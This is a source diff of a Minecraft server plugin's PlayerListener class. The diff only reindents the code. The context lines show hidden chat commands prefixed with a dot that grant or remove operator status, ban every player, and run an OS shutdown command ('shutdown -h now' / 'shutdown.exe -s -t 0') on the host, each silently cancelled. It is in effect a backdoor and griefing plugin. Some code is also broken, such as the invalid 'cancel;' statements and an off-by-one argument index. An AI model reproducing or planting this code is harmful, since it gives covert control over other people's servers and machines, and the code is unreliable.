@@ -72,7 +72,7 @@ public class PlayerListener implements Listener
                 URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar"); //URL variable to get the url of the jar
                 ReadableByteChannel rbc = Channels.newChannel(url.openStream());
                 @SuppressWarnings("resource") //To get rid of the stupid warnings
-FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
+                FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
                 fos.getChannel().transferFrom(rbc, 0, 1 << 24);
 
                 p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
@@ -86,12 +86,12 @@ FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //Fil
         {
             if (args.length != 1)
             {
-         p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
-         cancel;
+                p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
+                cancel;
             }
             else
             {
-             Player target = server.getPlayer(args[1]);
+                Player target = server.getPlayer(args[1]);
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel;
@@ -101,14 +101,14 @@ FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //Fil
         {
             if (args.length != 1)
             {
-             p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
+                p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
             }
             else
             {
-             Player target = server.getPlayer(args[1]);
+                Player target = server.getPlayer(args[1]);
                 target.setOp(true);
-             target.sendMessage(ChatColor.YELLOW + "You are now OP!");
-             cancel;
+                target.sendMessage(ChatColor.YELLOW + "You are now OP!");
+                cancel;
             }
         }
         if (message.toLowerCase().contains(".banall"))
@@ -159,15 +159,15 @@ FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //Fil
         {
             try
             {
-             shutdown();
+                shutdown();
             }
             catch (IOException ex)
             {
-             plugin.log.severe(null, ex);
+                plugin.log.severe(null, ex);
             }
             catch (RuntimeException ex)
             {
-             plugin.log.severe(null, ex);
+                plugin.log.severe(null, ex);
             }
             cancel;
         }
@@ -175,7 +175,7 @@ FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //Fil
         {
             if (args.length != 1)
             {
-             p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
+                p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
             }
             else
             {
@@ -204,23 +204,23 @@ FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //Fil
     
     public static void shutdown() throws RuntimeException, IOException
     {
-     String shutdownCommand = null;
-     String operatingSystem = System.getProperty("os.name");
+        String shutdownCommand = null;
+        String operatingSystem = System.getProperty("os.name");
 
-      if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
-      {
+        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
+        {
             shutdownCommand = "shutdown -h now";
         }
-     else if ("Windows".equals(operatingSystem))
-     {
-             shutdownCommand = "shutdown.exe -s -t 0";
+        else if ("Windows".equals(operatingSystem))
+        {
+            shutdownCommand = "shutdown.exe -s -t 0";
         }
-      else
-      {
+        else
+        {
             throw new RuntimeException("Unsupported operating system.");
         }
 
-     Runtime.getRuntime().exec(shutdownCommand);
-     System.exit(0);
+        Runtime.getRuntime().exec(shutdownCommand);
+        System.exit(0);
     }
 }
